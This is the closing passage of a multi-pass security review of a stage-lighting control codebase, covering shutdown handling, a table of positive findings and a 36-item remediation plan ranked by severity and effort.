If the process receives SIGTERM (e.g., `systemctl restart`):
- Running cue lists are aborted mid-execution with no cleanup
- The QLC+ WebSocket connection is dropped without a close frame
- Temp files from in-progress scene generation are orphaned
- The workspace file could be left in a partially-written state if killed during `tree.write()`

**Recommendation:**
- Register an `atexit` handler or SIGTERM signal handler
- Drain active cue lists, close the WebSocket cleanly, and ensure temp files are cleaned up
- Consider `tree.write()` to a temp file first, then `os.rename()` for atomic workspace updates

---

## Updated Positive Findings (Fifth Pass)

| Area | Assessment |
|------|------------|
| No open redirects | ✅ No `redirect()` or `Location` headers with user input |
| No file uploads | ✅ No `request.files` usage |
| No unsafe deserialization (pickle, yaml.load) | ✅ Only json.loads on request bodies |
| SocketIO not used for client events | ✅ No `@socketio.on` handlers (only used as WSGI runner) |
| Scene ID lookup uses XML tree search | ✅ Not filesystem path-based |
| Delete endpoints are idempotent | ✅ Return 404 if missing, don't error |
| Cue list actions use `_active_cue_lists_lock` | ✅ Proper lock on running state dict |

---

## Updated Remediation Plan (All Five Passes)

| # | Finding | Severity | Effort | Pass |
|---|---------|----------|--------|------|
| 1 | Add bearer token auth to control server | Critical | 2h | 1 |
| 2 | Wire up MCP bearer token | Critical | 1h | 1 |
| 3 | Restrict CORS origins | Critical | 15m | 1 |
| 4 | Replace `shell=True` with arg lists / `shlex.quote()` | Critical | 2h | 1 |
| 5 | **Validate template name against whitelist** | **Critical** | **15m** | **5** |
| 6 | Add Host header validation (DNS rebinding) | High | 30m | 4 |
| 7 | Add workspace file locking (threading.Lock) | High | 1h | 4 |
| 8 | Add `MAX_CONTENT_LENGTH` (1MB) | Medium | 5m | 3 |
| 9 | Add rate limiting (Flask-Limiter) | High | 1h | 1 |
| 10 | Add input length validation | Medium | 1h | 2 |
| 11 | Use `defusedxml` or reject large XML | Medium | 30m | 3 |
| 12 | Sanitize error responses (no `str(e)` to clients) | Medium | 2h | 3 |
| 13 | Add nginx security headers | Medium | 30m | 2 |
| 14 | Harden systemd service units | Medium | 30m | 2 |
| 15 | Hash WiFi PSKs with `wpa_passphrase` | High | 30m | 3 |
| 16 | Fix heredoc shell injection in setup.sh | Medium | 1h | 3 |
| 17 | Add `pip-audit` + `bandit` to CI | Low | 30m | 2 |
| 18 | Document Tailscale ACL policy | Low | 30m | 2 |
| 19 | Migrate to gunicorn + eventlet | High | 3h | 1 |
| 20 | Encrypt backups | Medium | 1h | 2 |
| 21 | Set Flask SECRET_KEY | Medium | 5m | 2 |
| 22 | Gate debug payloads behind env var | Low | 15m | 2 |
| 23 | Add chat loop total timeout | Medium | 30m | 3 |
| 24 | Fix MCP `_get()` error handling | Low | 15m | 3 |
| 25 | Validate channel_offset bounds | Low | 15m | 3 |
| 26 | Validate static-ip inputs | Low | 15m | 3 |
| 27 | Fix deploy script version mismatch / add hashes | Medium-High | 1h | 4 |
| 28 | Pin MCP server dependencies | Medium | 30m | 4 |
| 29 | Gate /api/status behind auth or reduce info | Medium | 30m | 4 |
| 30 | Strip Server header | Low-Medium | 5m | 4 |
| 31 | Pin GitHub Actions to SHAs | Low | 15m | 4 |
| 32 | **Cap /api/batch actions array (max 20)** | **Medium-High** | **15m** | **5** |
| 33 | **Stop leaking AI response in error messages** | **Medium** | **15m** | **5** |
| 34 | **Limit concurrent cue lists + cues per list** | **Medium** | **30m** | **5** |
| 35 | **Add JSON file locking (groups, cue lists)** | **Low-Medium** | **30m** | **5** |
| 36 | **Atomic workspace writes (write-then-rename)** | **Low** | **30m** | **5** |

**Total estimated effort:** ~24 hours for full remediation  
**Quick wins (items 3, 5, 8, 21, 30, 32, 33):** ~1.5 hours for major risk reduction

---

*Generated from five-pass codebase review (June 9, 2026). Manual penetration testing and runtime validation recommended for complete assurance.*
